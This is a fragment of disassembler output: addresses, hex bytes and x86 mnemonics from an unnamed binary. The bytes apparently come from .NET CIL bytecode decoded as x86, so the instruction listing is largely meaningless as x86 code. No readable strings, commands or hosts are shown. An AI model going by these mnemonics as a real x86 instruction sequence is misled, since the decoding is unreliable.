  404764:	0a 2d 08 16 8c 3b    	or     0x3b8c1608,%ch
  40476a:	00 00                	add    %al,(%eax)
  40476c:	01 2b                	add    %ebp,(%ebx)
  40476e:	06                   	push   %es
  40476f:	17                   	pop    %ss
  404770:	8c 3b                	mov    %?,(%ebx)
  404772:	00 00                	add    %al,(%eax)
  404774:	01 28                	add    %ebp,(%eax)
  404776:	e9 00 00 0a 2c       	jmp    0x2c4a477b
  40477b:	1d 08 14 72 37       	sbb    $0x37721408,%eax
  404780:	09 00                	or     %eax,(%eax)
  404782:	70 16                	jo     0x40479a
  404784:	8d 03                	lea    (%ebx),%eax
  404786:	00 00                	add    %al,(%eax)
  404788:	01 14 14             	add    %edx,(%esp,%edx,1)
  40478b:	14 28                	adc    $0x28,%al
  40478d:	ac                   	lods   %ds:(%esi),%al
  40478e:	00 00                	add    %al,(%eax)
  404790:	0a 28                	or     (%eax),%ch
  404792:	11 00                	adc    %eax,(%eax)
  404794:	00 0a                	add    %cl,(%edx)
  404796:	0c 2b                	or     $0x2b,%al
  404798:	1b 08                	sbb    (%eax),%ecx
  40479a:	14 72                	adc    $0x72,%al
  40479c:	28 07                	sub    %al,(%edi)
  40479e:	00 70 16             	add    %dh,0x16(%eax)
  4047a1:	8d 03                	lea    (%ebx),%eax
  4047a3:	00 00                	add    %al,(%eax)
  4047a5:	01 14 14             	add    %edx,(%esp,%edx,1)
  4047a8:	14 28                	adc    $0x28,%al
  4047aa:	ac                   	lods   %ds:(%esi),%al
  4047ab:	00 00                	add    %al,(%eax)
  4047ad:	0a 28                	or     (%eax),%ch
  4047af:	11 00                	adc    %eax,(%eax)
  4047b1:	00 0a                	add    %cl,(%edx)
  4047b3:	0c 11                	or     $0x11,%al
  4047b5:	04 28                	add    $0x28,%al
  4047b7:	ea 00 00 0a 1f 70 32 	ljmp   $0x3270,$0x1f0a0000
  4047be:	2f                   	das
  4047bf:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4047c2:	ea 00 00 0a 20 87 00 	ljmp   $0x87,$0x200a0000
  4047c9:	00 00                	add    %al,(%eax)
  4047cb:	30 21                	xor    %ah,(%ecx)
  4047cd:	72 47                	jb     0x404816
  4047cf:	09 00                	or     %eax,(%eax)
  4047d1:	70 11                	jo     0x4047e4
  4047d3:	04 28                	add    $0x28,%al
  4047d5:	ea 00 00 0a 28 78 00 	ljmp   $0x78,$0x280a0000
  4047dc:	00 0a                	add    %cl,(%edx)
  4047de:	72 46                	jb     0x404826
  4047e0:	07                   	pop    %es
  4047e1:	00 70 28             	add    %dh,0x28(%eax)
  4047e4:	53                   	push   %ebx
  4047e5:	00 00                	add    %al,(%eax)
  4047e7:	0a 0c 38             	or     (%eax,%edi,1),%cl
  4047ea:	42                   	inc    %edx
  4047eb:	01 00                	add    %eax,(%eax)
  4047ed:	00 11                	add    %dl,(%ecx)
  4047ef:	04 28                	add    $0x28,%al
  4047f1:	ea 00 00 0a 8c 85 00 	ljmp   $0x85,$0x8c0a0000
  4047f8:	00 01                	add    %al,(%ecx)
  4047fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4047fb:	eb 00                	jmp    0x4047fd
  4047fd:	00 0a                	add    %cl,(%edx)
  4047ff:	13 06                	adc    (%esi),%eax
  404801:	11 06                	adc    %eax,(%esi)
  404803:	72 4b                	jb     0x404850
  404805:	09 00                	or     %eax,(%eax)
  404807:	70 16                	jo     0x40481f
  404809:	28 4e 00             	sub    %cl,0x0(%esi)
  40480c:	00 0a                	add    %cl,(%edx)
  40480e:	16                   	push   %ss
  40480f:	33 0b                	xor    (%ebx),%ecx
  404811:	72 57                	jb     0x40486a
  404813:	09 00                	or     %eax,(%eax)
  404815:	70 0c                	jo     0x404823
  404817:	38 14 01             	cmp    %dl,(%ecx,%eax,1)
  40481a:	00 00                	add    %al,(%eax)
  40481c:	11 06                	adc    %eax,(%esi)
  40481e:	72 67                	jb     0x404887
  404820:	09 00                	or     %eax,(%eax)
  404822:	70 16                	jo     0x40483a
  404824:	28 4e 00             	sub    %cl,0x0(%esi)
  404827:	00 0a                	add    %cl,(%edx)
  404829:	16                   	push   %ss
  40482a:	33 0b                	xor    (%ebx),%ecx
  40482c:	72 75                	jb     0x4048a3
  40482e:	09 00                	or     %eax,(%eax)
  404830:	70 0c                	jo     0x40483e
  404832:	38 f9                	cmp    %bh,%cl
  404834:	00 00                	add    %al,(%eax)
  404836:	00 11                	add    %dl,(%ecx)
  404838:	06                   	push   %es
  404839:	72 85                	jb     0x4047c0
  40483b:	09 00                	or     %eax,(%eax)
  40483d:	70 16                	jo     0x404855
  40483f:	28 4e 00             	sub    %cl,0x0(%esi)
  404842:	00 0a                	add    %cl,(%edx)
  404844:	16                   	push   %ss
  404845:	33 0b                	xor    (%ebx),%ecx
  404847:	72 93                	jb     0x4047dc
  404849:	09 00                	or     %eax,(%eax)
  40484b:	70 0c                	jo     0x404859
  40484d:	38 de                	cmp    %bl,%dh
  40484f:	00 00                	add    %al,(%eax)
  404851:	00 11                	add    %dl,(%ecx)
  404853:	06                   	push   %es
  404854:	72 9f                	jb     0x4047f5
  404856:	09 00                	or     %eax,(%eax)
  404858:	70 16                	jo     0x404870
  40485a:	28 4e 00             	sub    %cl,0x0(%esi)
  40485d:	00 0a                	add    %cl,(%edx)
  40485f:	16                   	push   %ss
  404860:	33 0b                	xor    (%ebx),%ecx
  404862:	72 b7                	jb     0x40481b
  404864:	09 00                	or     %eax,(%eax)
  404866:	70 0c                	jo     0x404874
  404868:	38 c3                	cmp    %al,%bl
  40486a:	00 00                	add    %al,(%eax)
  40486c:	00 11                	add    %dl,(%ecx)
  40486e:	06                   	push   %es
  40486f:	72 c5                	jb     0x404836
  404871:	09 00                	or     %eax,(%eax)
  404873:	70 16                	jo     0x40488b
  404875:	28 4e 00             	sub    %cl,0x0(%esi)
  404878:	00 0a                	add    %cl,(%edx)
  40487a:	16                   	push   %ss
  40487b:	33 0b                	xor    (%ebx),%ecx
  40487d:	72 b7                	jb     0x404836
  40487f:	09 00                	or     %eax,(%eax)
  404881:	70 0c                	jo     0x40488f
  404883:	38 a8 00 00 00 11    	cmp    %ch,0x11000000(%eax)
  404889:	06                   	push   %es
  40488a:	72 dd                	jb     0x404869
  40488c:	09 00                	or     %eax,(%eax)
  40488e:	70 16                	jo     0x4048a6
  404890:	28 4e 00             	sub    %cl,0x0(%esi)
  404893:	00 0a                	add    %cl,(%edx)
  404895:	16                   	push   %ss
  404896:	33 0b                	xor    (%ebx),%ecx
  404898:	72 f1                	jb     0x40488b
  40489a:	09 00                	or     %eax,(%eax)
  40489c:	70 0c                	jo     0x4048aa
  40489e:	38 8d 00 00 00 11    	cmp    %cl,0x11000000(%ebp)
  4048a4:	06                   	push   %es
  4048a5:	72 01                	jb     0x4048a8
  4048a7:	0a 00                	or     (%eax),%al
  4048a9:	70 16                	jo     0x4048c1
  4048ab:	28 4e 00             	sub    %cl,0x0(%esi)
  4048ae:	00 0a                	add    %cl,(%edx)
  4048b0:	16                   	push   %ss
  4048b1:	33 08                	xor    (%eax),%ecx
  4048b3:	72 f1                	jb     0x4048a6
  4048b5:	09 00                	or     %eax,(%eax)
  4048b7:	70 0c                	jo     0x4048c5
  4048b9:	2b 75 11             	sub    0x11(%ebp),%esi
  4048bc:	06                   	push   %es
  4048bd:	72 15                	jb     0x4048d4
  4048bf:	0a 00                	or     (%eax),%al
  4048c1:	70 16                	jo     0x4048d9
  4048c3:	28 4e 00             	sub    %cl,0x0(%esi)
  4048c6:	00 0a                	add    %cl,(%edx)
  4048c8:	16                   	push   %ss
  4048c9:	33 08                	xor    (%eax),%ecx
  4048cb:	72 1f                	jb     0x4048ec
  4048cd:	0a 00                	or     (%eax),%al
  4048cf:	70 0c                	jo     0x4048dd
  4048d1:	2b 5d 11             	sub    0x11(%ebp),%ebx
  4048d4:	06                   	push   %es
  4048d5:	72 2d                	jb     0x404904
  4048d7:	0a 00                	or     (%eax),%al
  4048d9:	70 16                	jo     0x4048f1
  4048db:	28 4e 00             	sub    %cl,0x0(%esi)
  4048de:	00 0a                	add    %cl,(%edx)
  4048e0:	16                   	push   %ss
  4048e1:	33 08                	xor    (%eax),%ecx
  4048e3:	72 37                	jb     0x40491c
  4048e5:	0a 00                	or     (%eax),%al
  4048e7:	70 0c                	jo     0x4048f5
  4048e9:	2b 45 11             	sub    0x11(%ebp),%eax
  4048ec:	06                   	push   %es
  4048ed:	72 43                	jb     0x404932
  4048ef:	0a 00                	or     (%eax),%al
  4048f1:	70 16                	jo     0x404909
  4048f3:	28 4e 00             	sub    %cl,0x0(%esi)
  4048f6:	00 0a                	add    %cl,(%edx)
  4048f8:	16                   	push   %ss
  4048f9:	33 08                	xor    (%eax),%ecx
  4048fb:	72 4b                	jb     0x404948
  4048fd:	0a 00                	or     (%eax),%al
  4048ff:	70 0c                	jo     0x40490d
  404901:	2b 2d 11 06 72 57    	sub    0x57720611,%ebp
  404907:	0a 00                	or     (%eax),%al
  404909:	70 16                	jo     0x404921
  40490b:	28 4e 00             	sub    %cl,0x0(%esi)
  40490e:	00 0a                	add    %cl,(%edx)
  404910:	16                   	push   %ss
  404911:	33 1d 07 17 8c 3b    	xor    0x3b8c1707,%ebx
  404917:	00 00                	add    %al,(%eax)
  404919:	01 16                	add    %edx,(%esi)
  40491b:	28 ad 00 00 0a 2c    	sub    %ch,0x2c0a0000(%ebp)
  404921:	08 72 67             	or     %dh,0x67(%edx)
  404924:	0a 00                	or     (%eax),%al
  404926:	70 0c                	jo     0x404934
  404928:	2b 06                	sub    (%esi),%eax
  40492a:	72 87                	jb     0x4048b3
  40492c:	0a 00                	or     (%eax),%al
  40492e:	70 0c                	jo     0x40493c
  404930:	7e 0f                	jle    0x404941
  404932:	00 00                	add    %al,(%eax)
  404934:	04 17                	add    $0x17,%al
  404936:	73 ec                	jae    0x404924
  404938:	00 00                	add    %al,(%eax)
  40493a:	0a 13                	or     (%ebx),%dl
  40493c:	05 7e 20 00 00       	add    $0x207e,%eax
  404941:	04 28                	add    $0x28,%al
  404943:	45                   	inc    %ebp
  404944:	00 00                	add    %al,(%eax)
  404946:	06                   	push   %es
  404947:	28 ed                	sub    %ch,%ch
  404949:	00 00                	add    %al,(%eax)
  40494b:	0a 2c 0f             	or     (%edi,%ecx,1),%ch
  40494e:	11 05 08 28 11 00    	adc    %eax,0x112808
  404954:	00 0a                	add    %cl,(%edx)
  404956:	6f                   	outsl  %ds:(%esi),(%dx)
  404957:	ee                   	out    %al,(%dx)
  404958:	00 00                	add    %al,(%eax)
  40495a:	0a 2b                	or     (%ebx),%ch
  40495c:	34 11                	xor    $0x11,%al
  40495e:	05 28 ef 00 00       	add    $0xef28,%eax
  404963:	0a 6f d9             	or     -0x27(%edi),%ch
  404966:	00 00                	add    %al,(%eax)
  404968:	0a 11                	or     (%ecx),%dl
  40496a:	05 72 a5 0a 00       	add    $0xaa572,%eax
  40496f:	70 28                	jo     0x404999
  404971:	45                   	inc    %ebp
  404972:	00 00                	add    %al,(%eax)
  404974:	06                   	push   %es
  404975:	72 b1                	jb     0x404928
  404977:	0a 00                	or     (%eax),%al
  404979:	70 28                	jo     0x4049a3
  40497b:	53                   	push   %ebx
  40497c:	00 00                	add    %al,(%eax)
  40497e:	0a 6f d9             	or     -0x27(%edi),%ch
  404981:	00 00                	add    %al,(%eax)
  404983:	0a 11                	or     (%ecx),%dl
  404985:	05 08 28 11 00       	add    $0x112808,%eax
  40498a:	00 0a                	add    %cl,(%edx)
  40498c:	6f                   	outsl  %ds:(%esi),(%dx)
  40498d:	ee                   	out    %al,(%dx)
  40498e:	00 00                	add    %al,(%eax)
  404990:	0a de                	or     %dh,%bl
  404992:	0c 11                	or     $0x11,%al
  404994:	05 2c 07 11 05       	add    $0x511072c,%eax
  404999:	6f                   	outsl  %ds:(%esi),(%dx)
  40499a:	30 00                	xor    %al,(%eax)
  40499c:	00 0a                	add    %cl,(%edx)
  40499e:	dc 7e 23             	fdivrl 0x23(%esi)
  4049a1:	00 00                	add    %al,(%eax)
  4049a3:	04 02                	add    $0x2,%al
  4049a5:	03 04 28             	add    (%eax,%ebp,1),%eax
  4049a8:	48                   	dec    %eax
  4049a9:	00 00                	add    %al,(%eax)
  4049ab:	06                   	push   %es
  4049ac:	0a 2b                	or     (%ebx),%ch
  4049ae:	00 06                	add    %al,(%esi)
  4049b0:	2a 00                	sub    (%eax),%al
  4049b2:	00 00                	add    %al,(%eax)
  4049b4:	01 10                	add    %edx,(%eax)
  4049b6:	00 00                	add    %al,(%eax)
  4049b8:	02 00                	add    (%eax),%al
  4049ba:	65 02 56 bb          	add    %gs:-0x45(%esi),%dl
  4049be:	02 0c 00             	add    (%eax,%eax,1),%cl
  4049c1:	00 00                	add    %al,(%eax)
  4049c3:	00 1b                	add    %bl,(%ebx)
  4049c5:	30 07                	xor    %al,(%edi)
  4049c7:	00 8b 00 00 00 2b    	add    %cl,0x2b000000(%ebx)
  4049cd:	00 00                	add    %al,(%eax)
  4049cf:	11 16                	adc    %edx,(%esi)
  4049d1:	0b 73 55             	or     0x55(%ebx),%esi
  4049d4:	00 00                	add    %al,(%eax)
  4049d6:	0a 0d 20 00 01 00    	or     0x10020,%cl
  4049dc:	00 8d 36 00 00 01    	add    %cl,0x1000036(%ebp)
  4049e2:	13 05 11 05 74 09    	adc    0x9740511,%eax
  4049e8:	00 00                	add    %al,(%eax)
  4049ea:	1b 28                	sbb    (%eax),%ebp
  4049ec:	4d                   	dec    %ebp
  4049ed:	00 00                	add    %al,(%eax)
  4049ef:	06                   	push   %es
  4049f0:	2d 08 72 4a 03       	sub    $0x34a7208,%eax
  4049f5:	00 70 0a             	add    %dh,0xa(%eax)
  4049f8:	de 5f 02             	ficomps 0x2(%edi)
  4049fb:	16                   	push   %ss
  4049fc:	28 50 00             	sub    %dl,0x0(%eax)
  4049ff:	00 06                	add    %al,(%esi)
  404a01:	8c 86 00 00 01 13    	mov    %es,0x13010000(%esi)
  404a07:	04 28                	add    $0x28,%al
  404a09:	4a                   	dec    %edx
  404a0a:	00 00                	add    %al,(%eax)
  404a0c:	06                   	push   %es
  404a0d:	12 01                	adc    (%ecx),%al
  404a0f:	28 4b 00             	sub    %cl,0x0(%ebx)
  404a12:	00 06                	add    %al,(%esi)
  404a14:	28 4e 00             	sub    %cl,0x0(%esi)
  404a17:	00 06                	add    %al,(%esi)
  404a19:	0c 02                	or     $0x2,%al
  404a1b:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  404a1e:	e8 00 00 0a 11       	call   0x114a4a23
  404a23:	05 74 09 00 00       	add    $0x974,%eax
  404a28:	1b 09                	sbb    (%ecx),%ecx
  404a2a:	1b 16                	sbb    (%esi),%edx
  404a2c:	08 28                	or     %ch,(%eax)
  404a2e:	4f                   	dec    %edi
  404a2f:	00 00                	add    %al,(%eax)
  404a31:	06                   	push   %es
  404a32:	26 09 6f 5c          	or     %ebp,%es:0x5c(%edi)
  404a36:	00 00                	add    %al,(%eax)
  404a38:	0a 0a                	or     (%edx),%cl
  404a3a:	de 1d de 0c 28 23    	ficomps 0x23280cde
  404a40:	00 00                	add    %al,(%eax)
  404a42:	0a 28                	or     (%eax),%ch
  404a44:	25 00 00 0a de       	and    $0xde0a0000,%eax
  404a49:	00 02                	add    %al,(%edx)
  404a4b:	84 8c 85 00 00 01 6f 	test   %cl,0x6f010000(%ebp,%eax,4)
  404a52:	eb 00                	jmp    0x404a54
  404a54:	00 0a                	add    %cl,(%edx)
  404a56:	0a 2b                	or     (%ebx),%ch
  404a58:	00 06                	add    %al,(%esi)
  404a5a:	2a 00                	sub    (%eax),%al
  404a5c:	01 10                	add    %edx,(%eax)
  404a5e:	00 00                	add    %al,(%eax)
  404a60:	00 00                	add    %al,(%eax)
  404a62:	02 00                	add    (%eax),%al
  404a64:	6c                   	insb   (%dx),%es:(%edi)
  404a65:	6e                   	outsb  %ds:(%esi),(%dx)
  404a66:	00 0c 26             	add    %cl,(%esi,%eiz,1)
  404a69:	00 00                	add    %al,(%eax)
  404a6b:	01 1b                	add    %ebx,(%ebx)
  404a6d:	30 07                	xor    %al,(%edi)
  404a6f:	00 95 00 00 00 2c    	add    %dl,0x2c000000(%ebp)
  404a75:	00 00                	add    %al,(%eax)
  404a77:	11 16                	adc    %edx,(%esi)
  404a79:	0b 28                	or     (%eax),%ebp
  404a7b:	4a                   	dec    %edx
  404a7c:	00 00                	add    %al,(%eax)
  404a7e:	06                   	push   %es
  404a7f:	0c 08                	or     $0x8,%al
  404a81:	12 01                	adc    (%ecx),%al
  404a83:	28 4b 00             	sub    %cl,0x0(%ebx)
  404a86:	00 06                	add    %al,(%esi)
  404a88:	26 07                	es pop %es
  404a8a:	84 28                	test   %ch,(%eax)
  404a8c:	f0 00 00             	lock add %al,(%eax)
  404a8f:	0a 0d 09 14 72 bb    	or     0xbb721409,%cl
  404a95:	0a 00                	or     (%eax),%al
  404a97:	70 16                	jo     0x404aaf
  404a99:	8d 03                	lea    (%ebx),%eax
  404a9b:	00 00                	add    %al,(%eax)
  404a9d:	01 14 14             	add    %edx,(%esp,%edx,1)
  404aa0:	14 28                	adc    $0x28,%al
  404aa2:	ac                   	lods   %ds:(%esi),%al
  404aa3:	00 00                	add    %al,(%eax)
  404aa5:	0a 28                	or     (%eax),%ch
  404aa7:	11 00                	adc    %eax,(%eax)
  404aa9:	00 0a                	add    %cl,(%edx)
  404aab:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404aae:	04 28                	add    $0x28,%al
  404ab0:	22 00                	and    (%eax),%al
  404ab2:	00 0a                	add    %cl,(%edx)
  404ab4:	28 f1                	sub    %dh,%cl
  404ab6:	00 00                	add    %al,(%eax)
  404ab8:	0a 2c 1c             	or     (%esp,%ebx,1),%ch
  404abb:	09 14 72             	or     %edx,(%edx,%esi,2)
  404abe:	db 0a                	fisttpl (%edx)
  404ac0:	00 70 16             	add    %dh,0x16(%eax)
  404ac3:	8d 03                	lea    (%ebx),%eax
  404ac5:	00 00                	add    %al,(%eax)
  404ac7:	01 14 14             	add    %edx,(%esp,%edx,1)
  404aca:	14 28                	adc    $0x28,%al
  404acc:	ac                   	lods   %ds:(%esi),%al
  404acd:	00 00                	add    %al,(%eax)
  404acf:	0a 28                	or     (%eax),%ch
  404ad1:	11 00                	adc    %eax,(%eax)
  404ad3:	00 0a                	add    %cl,(%edx)
  404ad5:	13 04 11             	adc    (%ecx,%edx,1),%eax
  404ad8:	04 28                	add    $0x28,%al
  404ada:	22 00                	and    (%eax),%al
  404adc:	00 0a                	add    %cl,(%edx)
  404ade:	80 20 00             	andb   $0x0,(%eax)
  404ae1:	00 04 11             	add    %al,(%ecx,%edx,1)
  404ae4:	04 28                	add    $0x28,%al
  404ae6:	22 00                	and    (%eax),%al
  404ae8:	00 0a                	add    %cl,(%edx)
  404aea:	0a de                	or     %dh,%bl
  404aec:	1e                   	push   %ds
  404aed:	de 1c 25 28 23 00 00 	ficomps 0x2328(,%eiz,1)
  404af4:	0a 13                	or     (%ebx),%dl
  404af6:	05 72 f3 0a 00       	add    $0xaf372,%eax
  404afb:	70 0a                	jo     0x404b07
  404afd:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  404b03:	07                   	pop    %es
  404b04:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  404b0a:	00 06                	add    %al,(%esi)
  404b0c:	2a 00                	sub    (%eax),%al
  404b0e:	00 00                	add    %al,(%eax)
  404b10:	01 10                	add    %edx,(%eax)
  404b12:	00 00                	add    %al,(%eax)
  404b14:	00 00                	add    %al,(%eax)
  404b16:	02 00                	add    (%eax),%al
  404b18:	75 77                	jne    0x404b91
  404b1a:	00 1c 26             	add    %bl,(%esi,%eiz,1)
  404b1d:	00 00                	add    %al,(%eax)
  404b1f:	01 1e                	add    %ebx,(%esi)
  404b21:	02 28                	add    (%eax),%ch
  404b23:	17                   	pop    %ss
  404b24:	00 00                	add    %al,(%eax)
  404b26:	0a 2a                	or     (%edx),%ch
  404b28:	13 30                	adc    (%eax),%esi
  404b2a:	05 00 80 00 00       	add    $0x8000,%eax
  404b2f:	00 2d 00 00 11 73    	add    %ch,0x73110000
  404b35:	f3 00 00             	repz add %al,(%eax)
  404b38:	0a 0a                	or     (%edx),%cl
  404b3a:	73 f4                	jae    0x404b30
  404b3c:	00 00                	add    %al,(%eax)
  404b3e:	0a 13                	or     (%ebx),%dl
  404b40:	06                   	push   %es
  404b41:	72 4a                	jb     0x404b8d
  404b43:	03 00                	add    (%eax),%eax
  404b45:	70 0d                	jo     0x404b54
  404b47:	1f                   	pop    %ds
  404b48:	20 8d 36 00 00 01    	and    %cl,0x1000036(%ebp)
  404b4e:	13 05 11 06 7e 0e    	adc    0xe7e0611,%eax
  404b54:	00 00                	add    %al,(%eax)
  404b56:	04 28                	add    $0x28,%al
  404b58:	5f                   	pop    %edi
  404b59:	00 00                	add    %al,(%eax)
  404b5b:	06                   	push   %es
  404b5c:	6f                   	outsl  %ds:(%esi),(%dx)
  404b5d:	f5                   	cmc
  404b5e:	00 00                	add    %al,(%eax)
  404b60:	0a 13                	or     (%ebx),%dl
  404b62:	07                   	pop    %es
  404b63:	11 07                	adc    %eax,(%edi)
  404b65:	16                   	push   %ss
  404b66:	11 05 16 1f 10 28    	adc    %eax,0x28101f16
  404b6c:	f6 00 00             	testb  $0x0,(%eax)
  404b6f:	0a 11                	or     (%ecx),%dl
  404b71:	07                   	pop    %es
  404b72:	16                   	push   %ss
  404b73:	11 05 1f 0f 1f 10    	adc    %eax,0x101f0f1f
  404b79:	28 f6                	sub    %dh,%dh
  404b7b:	00 00                	add    %al,(%eax)
  404b7d:	0a 06                	or     (%esi),%al
  404b7f:	11 05 6f f7 00 00    	adc    %eax,0xf76f
  404b85:	0a 06                	or     (%esi),%al
  404b87:	18 6f f8             	sbb    %ch,-0x8(%edi)
  404b8a:	00 00                	add    %al,(%eax)
  404b8c:	0a 06                	or     (%esi),%al
  404b8e:	6f                   	outsl  %ds:(%esi),(%dx)
  404b8f:	f9                   	stc
  404b90:	00 00                	add    %al,(%eax)
  404b92:	0a 13                	or     (%ebx),%dl
  404b94:	04 02                	add    $0x2,%al
  404b96:	28 86 00 00 0a 0b    	sub    %al,0xb0a0000(%esi)
  404b9c:	11 04 07             	adc    %eax,(%edi,%eax,1)
  404b9f:	16                   	push   %ss
  404ba0:	07                   	pop    %es
  404ba1:	8e b7 6f fa 00 00    	mov    0xfa6f(%edi),%?
  404ba7:	0a 28                	or     (%eax),%ch
  404ba9:	60                   	pusha
  404baa:	00 00                	add    %al,(%eax)
  404bac:	06                   	push   %es
  404bad:	0d 09 0c 2b 00       	or     $0x2b0c09,%eax
  404bb2:	08 2a                	or     %ch,(%edx)
  404bb4:	13 30                	adc    (%eax),%esi
  404bb6:	03 00                	add    (%eax),%eax
  404bb8:	75 00                	jne    0x404bba
  404bba:	00 00                	add    %al,(%eax)
  404bbc:	2e 00 00             	add    %al,%cs:(%eax)
  404bbf:	11 16                	adc    %edx,(%esi)
  404bc1:	80 25 00 00 04 73 31 	andb   $0x31,0x73040000
  404bc8:	00 00                	add    %al,(%eax)
  404bca:	0a 80 27 00 00 04    	or     0x4000027(%eax),%al
  404bd0:	72 fb                	jb     0x404bcd
  404bd2:	0a 00                	or     (%eax),%al
  404bd4:	70 28                	jo     0x404bfe
  404bd6:	61                   	popa
  404bd7:	00 00                	add    %al,(%eax)
  404bd9:	06                   	push   %es
  404bda:	28 1e                	sub    %bl,(%esi)
  404bdc:	00 00                	add    %al,(%eax)
  404bde:	0a 80 28 00 00 04    	or     0x4000028(%eax),%al
  404be4:	28 e3                	sub    %ah,%bl
  404be6:	00 00                	add    %al,(%eax)
  404be8:	0a 6f fb             	or     -0x5(%edi),%ch
  404beb:	00 00                	add    %al,(%eax)
  404bed:	0a 6f fc             	or     -0x4(%edi),%ch
  404bf0:	00 00                	add    %al,(%eax)
  404bf2:	0a 80 29 00 00 04    	or     0x4000029(%eax),%al
  404bf8:	7f 2b                	jg     0x404c25
  404bfa:	00 00                	add    %al,(%eax)
  404bfc:	04 fe                	add    $0xfe,%al
  404bfe:	15 10 00 00 02       	adc    $0x2000010,%eax
  404c03:	7f 2c                	jg     0x404c31
  404c05:	00 00                	add    %al,(%eax)
  404c07:	04 16                	add    $0x16,%al
  404c09:	6a 28                	push   $0x28
  404c0b:	fd                   	std
  404c0c:	00 00                	add    %al,(%eax)
  404c0e:	0a 19                	or     (%ecx),%bl
  404c10:	8d 23                	lea    (%ebx),%esp
  404c12:	00 00                	add    %al,(%eax)
  404c14:	01 0a                	add    %ecx,(%edx)
  404c16:	06                   	push   %es
  404c17:	16                   	push   %ss
  404c18:	72 0f                	jb     0x404c29
  404c1a:	0b 00                	or     (%eax),%eax
  404c1c:	70 a2                	jo     0x404bc0
  404c1e:	06                   	push   %es
  404c1f:	17                   	pop    %ss
  404c20:	72 ac                	jb     0x404bce
  404c22:	0b 00                	or     (%eax),%eax
  404c24:	70 a2                	jo     0x404bc8
  404c26:	06                   	push   %es
  404c27:	18 72 c1             	sbb    %dh,-0x3f(%edx)
  404c2a:	0c 00                	or     $0x0,%al
  404c2c:	70 a2                	jo     0x404bd0
  404c2e:	06                   	push   %es
  404c2f:	80 2f 00             	subb   $0x0,(%edi)
  404c32:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404c35:	00 00                	add    %al,(%eax)
  404c37:	00 13                	add    %dl,(%ebx)
  404c39:	30 02                	xor    %al,(%edx)
  404c3b:	00 11                	add    %dl,(%ecx)
  404c3d:	00 00                	add    %al,(%eax)
  404c3f:	00 2f                	add    %ch,(%edi)
  404c41:	00 00                	add    %al,(%eax)
  404c43:	11 02                	adc    %eax,(%edx)
  404c45:	28 fe                	sub    %bh,%dh
  404c47:	00 00                	add    %al,(%eax)
  404c49:	0a 16                	or     (%esi),%dl
  404c4b:	fe 01                	incb   (%ecx)
  404c4d:	16                   	push   %ss
  404c4e:	fe 01                	incb   (%ecx)
  404c50:	0a 2b                	or     (%ebx),%ch
  404c52:	00 06                	add    %al,(%esi)
  404c54:	2a 00                	sub    (%eax),%al
  404c56:	00 00                	add    %al,(%eax)
  404c58:	13 30                	adc    (%eax),%esi
  404c5a:	04 00                	add    $0x0,%al
  404c5c:	47                   	inc    %edi
  404c5d:	00 00                	add    %al,(%eax)
  404c5f:	00 30                	add    %dh,(%eax)
  404c61:	00 00                	add    %al,(%eax)
  404c63:	11 02                	adc    %eax,(%edx)
  404c65:	73 ff                	jae    0x404c66
  404c67:	00 00                	add    %al,(%eax)
  404c69:	0a 0b                	or     (%ebx),%cl
  404c6b:	16                   	push   %ss
  404c6c:	02 17                	add    (%edi),%dl
  404c6e:	da 0d 0c 2b 29 07    	fimull 0x7292b0c
  404c74:	72 aa                	jb     0x404c20
  404c76:	0d 00 70 7e 27       	or     $0x277e7000,%eax
  404c7b:	00 00                	add    %al,(%eax)
  404c7d:	04 72                	add    $0x72,%al
  404c7f:	aa                   	stos   %al,%es:(%edi)
  404c80:	0d 00 70 6f 5d       	or     $0x5d6f7000,%eax
  404c85:	00 00                	add    %al,(%eax)
  404c87:	0a 6f c1             	or     -0x3f(%edi),%ch
  404c8a:	00 00                	add    %al,(%eax)
  404c8c:	0a 6f 00             	or     0x0(%edi),%ch
  404c8f:	01 00                	add    %eax,(%eax)
  404c91:	0a 6f 01             	or     0x1(%edi),%ch
  404c94:	01 00                	add    %eax,(%eax)
  404c96:	0a 26                	or     (%esi),%ah
  404c98:	08 17                	or     %dl,(%edi)
  404c9a:	d6                   	salc
  404c9b:	0c 08                	or     $0x8,%al
  404c9d:	09 31                	or     %esi,(%ecx)
  404c9f:	d3 07                	roll   %cl,(%edi)
  404ca1:	6f                   	outsl  %ds:(%esi),(%dx)
  404ca2:	5c                   	pop    %esp
  404ca3:	00 00                	add    %al,(%eax)
  404ca5:	0a 0a                	or     (%edx),%cl
  404ca7:	2b 00                	sub    (%eax),%eax
  404ca9:	06                   	push   %es
  404caa:	2a 00                	sub    (%eax),%al
  404cac:	13 30                	adc    (%eax),%esi
  404cae:	02 00                	add    (%eax),%al
  404cb0:	6f                   	outsl  %ds:(%esi),(%dx)
  404cb1:	00 00                	add    %al,(%eax)
  404cb3:	00 31                	add    %dh,(%ecx)
  404cb5:	00 00                	add    %al,(%eax)
  404cb7:	11 16                	adc    %edx,(%esi)
  404cb9:	80 2a 00             	subb   $0x0,(%edx)
  404cbc:	00 04 7f             	add    %al,(%edi,%edi,2)
  404cbf:	2b 00                	sub    (%eax),%eax
  404cc1:	00 04 7e             	add    %al,(%esi,%edi,2)
  404cc4:	2b 00                	sub    (%eax),%eax
  404cc6:	00 04 28             	add    %al,(%eax,%ebp,1)
  404cc9:	04 00                	add    $0x0,%al
  404ccb:	00 2b                	add    %ch,(%ebx)
  404ccd:	7d 31                	jge    0x404d00
  404ccf:	00 00                	add    %al,(%eax)
  404cd1:	04 7f                	add    $0x7f,%al
  404cd3:	2b 00                	sub    (%eax),%eax
  404cd5:	00 04 16             	add    %al,(%esi,%edx,1)
  404cd8:	7d 32                	jge    0x404d0c
  404cda:	00 00                	add    %al,(%eax)
  404cdc:	04 7f                	add    $0x7f,%al
  404cde:	2b 00                	sub    (%eax),%eax
  404ce0:	00 04 28             	add    %al,(%eax,%ebp,1)
  404ce3:	57                   	push   %edi
  404ce4:	00 00                	add    %al,(%eax)
  404ce6:	06                   	push   %es
  404ce7:	2c 15                	sub    $0x15,%al
  404ce9:	28 03                	sub    %al,(%ebx)
  404ceb:	01 00                	add    %eax,(%eax)
  404ced:	0a 7f 2b             	or     0x2b(%edi),%bh
  404cf0:	00 00                	add    %al,(%eax)
  404cf2:	04 7b                	add    $0x7b,%al
